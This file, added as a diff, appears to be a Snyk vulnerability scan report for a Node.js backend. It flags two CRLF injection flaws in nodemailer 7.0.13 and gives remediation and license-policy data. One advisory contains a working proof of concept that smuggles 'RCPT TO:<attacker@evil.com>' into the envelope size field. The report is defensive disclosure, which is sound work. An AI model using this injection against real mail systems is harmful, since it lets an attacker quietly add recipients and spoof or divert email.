@@ -1,0 +1,356 @@
+{
+  "vulnerabilities": [
+    {
+      "id": "SNYK-JS-NODEMAILER-15790064",
+      "title": "CRLF Injection",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N/E:P",
+      "credit": [
+        "esquilichi"
+      ],
+      "semver": {
+        "vulnerable": [
+          "<8.0.4"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "8.0.4"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "js",
+      "severity": "low",
+      "cvssScore": 2.3,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "nodemailer",
+      "references": [
+        {
+          "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-c7w3-x93f-qmm8",
+          "title": "GitHub Advisory"
+        },
+        {
+          "url": "https://github.com/nodemailer/nodemailer/commit/2d7b9710e63555a1eb13d721296c51186d4b5651",
+          "title": "GitHub Commit"
+        }
+      ],
+      "cvssDetails": [],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N/E:P",
+          "assigner": "Snyk",
+          "severity": "low",
+          "baseScore": 2.3,
+          "cvssVersion": "4.0",
+          "modificationTime": "2026-05-21T02:01:41.368368Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:N/I:L/A:N/E:P",
+          "assigner": "Snyk",
+          "severity": "low",
+          "baseScore": 3.1,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-05-21T02:01:41.368368Z"
+        }
+      ],
+      "description": "## Overview\n[nodemailer](https://www.npmjs.org/package/nodemailer) is an Easy as cake e-mail sending from your Node.js applications\n\nAffected versions of this package are vulnerable to CRLF Injection via the `envelope.size` parameter in the `sendMail` function. An attacker can inject arbitrary SMTP commands by supplying CRLF characters in the `size` property, which are concatenated directly into the SMTP command stream. This can result in unauthorized recipients being added to outgoing emails or other SMTP commands being executed.\r\n\r\n**Note:**\r\n\r\nThis is only exploitable if the application explicitly passes a custom envelope object with a user-controlled `size` property to the mail sending process.\n## PoC\n```js\r\nconst net = require('net');\r\nconst nodemailer = require('nodemailer');\r\n\r\n// Minimal SMTP server that logs raw commands\r\nconst server = net.createServer(socket => {\r\n    socket.write('220 localhost ESMTP\\r\\n');\r\n    let buffer = '';\r\n    socket.on('data', chunk => {\r\n        buffer += chunk.toString();\r\n        const lines = buffer.split('\\r\\n');\r\n        buffer = lines.pop();\r\n        for (const line of lines) {\r\n            if (!line) continue;\r\n            console.log('C:', line);\r\n            if (line.startsWith('EHLO')) {\r\n                socket.write('250-localhost\\r\\n250-SIZE 10485760\\r\\n250 OK\\r\\n');\r\n            } else if (line.startsWith('MAIL FROM')) {\r\n                socket.write('250 OK\\r\\n');\r\n            } else if (line.startsWith('RCPT TO')) {\r\n                socket.write('250 OK\\r\\n');\r\n            } else if (line === 'DATA') {\r\n                socket.write('354 Start\\r\\n');\r\n            } else if (line === '.') {\r\n                socket.write('250 OK\\r\\n');\r\n            } else if (line.startsWith('QUIT')) {\r\n                socket.write('221 Bye\\r\\n');\r\n                socket.end();\r\n            }\r\n        }\r\n    });\r\n});\r\n\r\nserver.listen(0, '127.0.0.1', () => {\r\n    const port = server.address().port;\r\n    console.log('SMTP server on port', port);\r\n    console.log('Sending email with injected RCPT TO...\\n');\r\n\r\n    const transporter = nodemailer.createTransport({\r\n        host: '127.0.0.1',\r\n        port,\r\n        secure: false,\r\n        tls: { rejectUnauthorized: false },\r\n    });\r\n\r\n    transporter.sendMail({\r\n        from: 'sender@example.com',\r\n        to: 'recipient@example.com',\r\n        subject: 'Normal email',\r\n        text: 'This is a normal email.',\r\n        envelope: {\r\n            from: 'sender@example.com',\r\n            to: ['recipient@example.com'],\r\n            size: '100\\r\\nRCPT TO:<attacker@evil.com>',\r\n        },\r\n    }, (err) => {\r\n        if (err) console.error('Error:', err.message);\r\n        console.log('\\nExpected output above:');\r\n        console.log('  C: MAIL FROM:<sender@example.com> SIZE=100');\r\n        console.log('  C: RCPT TO:<attacker@evil.com>        <-- INJECTED');\r\n        console.log('  C: RCPT TO:<recipient@example.com>');\r\n        server.close();\r\n        transporter.close();\r\n    });\r\n});\r\n```\n## Remediation\nUpgrade `nodemailer` to version 8.0.4 or higher.\n## References\n- [GitHub Advisory](https://github.com/nodemailer/nodemailer/security/advisories/GHSA-c7w3-x93f-qmm8)\n- [GitHub Commit](https://github.com/nodemailer/nodemailer/commit/2d7b9710e63555a1eb13d721296c51186d4b5651)\n",
+      "epssDetails": null,
+      "identifiers": {
+        "CVE": [],
+        "CWE": [
+          "CWE-93"
+        ],
+        "GHSA": [
+          "GHSA-c7w3-x93f-qmm8"
+        ]
+      },
+      "packageName": "nodemailer",
+      "proprietary": false,
+      "creationTime": "2026-03-27T09:52:04.273656Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2026-03-26T22:26:46Z",
+      "exploitDetails": {
+        "sources": [
+          "Snyk"
+        ],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Proof of Concept",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Proof of Concept",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "npm",
+      "publicationTime": "2026-03-27T09:52:04.502230Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-05-21T02:01:41.368368Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "low",
+      "from": [
+        "cyna_backend@0.0.1",
+        "nodemailer@7.0.13"
+      ],
+      "upgradePath": [
+        false,
+        "nodemailer@8.0.4"
+      ],
+      "isUpgradable": true,
+      "isPatchable": false,
+      "name": "nodemailer",
+      "version": "7.0.13"
+    },
+    {
+      "id": "SNYK-JS-NODEMAILER-15930946",
+      "title": "CRLF Injection",
+      "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:N/E:P",
+      "credit": [
+        "ByunSuyoung"
+      ],
+      "semver": {
+        "vulnerable": [
+          "<8.0.5"
+        ]
+      },
+      "exploit": "Proof of Concept",
+      "fixedIn": [
+        "8.0.5"
+      ],
+      "patches": [],
+      "insights": {
+        "triageAdvice": null
+      },
+      "language": "js",
+      "severity": "medium",
+      "cvssScore": 6.9,
+      "functions": [],
+      "malicious": false,
+      "isDisputed": false,
+      "moduleName": "nodemailer",
+      "references": [
+        {
+          "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-vvjj-xcjg-gr5g",
+          "title": "GitHub Advisory"
+        },
+        {
+          "url": "https://github.com/nodemailer/nodemailer/commit/0a43876801a420ca528f492eaa01bfc421cc306e",
+          "title": "GitHub Commit"
+        },
+        {
+          "url": "https://github.com/nodemailer/nodemailer/releases/tag/v8.0.5",
+          "title": "GitHub Release"
+        }
+      ],
+      "cvssDetails": [],
+      "cvssSources": [
+        {
+          "type": "primary",
+          "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 6.9,
+          "cvssVersion": "4.0",
+          "modificationTime": "2026-05-21T02:01:41.368730Z"
+        },
+        {
+          "type": "secondary",
+          "vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:H/A:N/E:P",
+          "assigner": "Snyk",
+          "severity": "medium",
+          "baseScore": 4.9,
+          "cvssVersion": "3.1",
+          "modificationTime": "2026-05-21T02:01:41.368730Z"
+        }
+      ],
+      "description": "## Overview\n[nodemailer](https://www.npmjs.org/package/nodemailer) is an Easy as cake e-mail sending from your Node.js applications\n\nAffected versions of this package are vulnerable to CRLF Injection via the `name` configuration configuration option. An attacker can inject arbitrary SMTP commands by supplying carriage return and line feed sequences, enabling unauthorized email sending, sender spoofing, and phishing attacks before authentication occurs.\n## Remediation\nUpgrade `nodemailer` to version 8.0.5 or higher.\n## References\n- [GitHub Advisory](https://github.com/nodemailer/nodemailer/security/advisories/GHSA-vvjj-xcjg-gr5g)\n- [GitHub Commit](https://github.com/nodemailer/nodemailer/commit/0a43876801a420ca528f492eaa01bfc421cc306e)\n- [GitHub Release](https://github.com/nodemailer/nodemailer/releases/tag/v8.0.5)\n",
+      "epssDetails": null,
+      "identifiers": {
+        "CVE": [],
+        "CWE": [
+          "CWE-93"
+        ],
+        "GHSA": [
+          "GHSA-vvjj-xcjg-gr5g"
+        ]
+      },
+      "packageName": "nodemailer",
+      "proprietary": false,
+      "creationTime": "2026-04-08T18:04:24.112653Z",
+      "functions_new": [],
+      "alternativeIds": [],
+      "disclosureTime": "2026-04-08T15:05:20Z",
+      "exploitDetails": {
+        "sources": [
+          "Snyk"
+        ],
+        "maturityLevels": [
+          {
+            "type": "secondary",
+            "level": "Proof of Concept",
+            "format": "CVSSv3"
+          },
+          {
+            "type": "primary",
+            "level": "Proof of Concept",
+            "format": "CVSSv4"
+          }
+        ]
+      },
+      "packageManager": "npm",
+      "publicationTime": "2026-04-08T18:04:24.338546Z",
+      "severityBasedOn": "CVSS",
+      "modificationTime": "2026-05-21T02:01:41.368730Z",
+      "socialTrendAlert": false,
+      "severityWithCritical": "medium",
+      "from": [
+        "cyna_backend@0.0.1",
+        "nodemailer@7.0.13"
+      ],
+      "upgradePath": [
+        false,
+        "nodemailer@8.0.5"
+      ],
+      "isUpgradable": true,
+      "isPatchable": false,
+      "name": "nodemailer",
+      "version": "7.0.13"
+    }
+  ],
+  "ok": false,
+  "dependencyCount": 163,
+  "org": "namory58",
+  "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
+  "isPrivate": true,
+  "licensesPolicy": {
+    "severities": {},
+    "orgLicenseRules": {
+      "AGPL-1.0": {
+        "licenseType": "AGPL-1.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "AGPL-3.0": {
+        "licenseType": "AGPL-3.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "Artistic-1.0": {
+        "licenseType": "Artistic-1.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "Artistic-2.0": {
+        "licenseType": "Artistic-2.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "CDDL-1.0": {
+        "licenseType": "CDDL-1.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "CPOL-1.02": {
+        "licenseType": "CPOL-1.02",
+        "severity": "high",
+        "instructions": ""
+      },
+      "EPL-1.0": {
+        "licenseType": "EPL-1.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "GPL-2.0": {
+        "licenseType": "GPL-2.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "GPL-3.0": {
+        "licenseType": "GPL-3.0",
+        "severity": "high",
+        "instructions": ""
+      },
+      "LGPL-2.0": {
+        "licenseType": "LGPL-2.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "LGPL-2.1": {
+        "licenseType": "LGPL-2.1",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "LGPL-3.0": {
+        "licenseType": "LGPL-3.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "MPL-1.1": {
+        "licenseType": "MPL-1.1",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "MPL-2.0": {
+        "licenseType": "MPL-2.0",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "MS-RL": {
+        "licenseType": "MS-RL",
+        "severity": "medium",
+        "instructions": ""
+      },
+      "SimPL-2.0": {
+        "licenseType": "SimPL-2.0",
+        "severity": "high",
+        "instructions": ""
+      }
+    }
+  },
+  "packageManager": "npm",
+  "ignoreSettings": {
+    "adminOnly": false,
+    "reasonRequired": false,
+    "disregardFilesystemIgnores": false
+  },
+  "summary": "2 vulnerable dependency paths",
+  "remediation": {
+    "unresolved": [],
+    "upgrade": {
+      "nodemailer@7.0.13": {
+        "upgradeTo": "nodemailer@8.0.5",
+        "upgrades": [
+          "nodemailer@7.0.13",
+          "nodemailer@7.0.13"
+        ],
+        "vulns": [
+          "SNYK-JS-NODEMAILER-15930946",
+          "SNYK-JS-NODEMAILER-15790064"
+        ]
+      }
+    },
+    "patch": {},
+    "ignore": {},
+    "pin": {}
+  },
+  "filesystemPolicy": false,
+  "filtered": {
+    "ignore": [],
+    "patch": []
+  },
+  "uniqueCount": 2,
+  "projectName": "cyna_backend",
+  "displayTargetFile": "package-lock.json",
+  "hasUnknownVersions": false,
+  "path": "/Users/namory/Desktop/Ingetis/cyna_backend"
+}
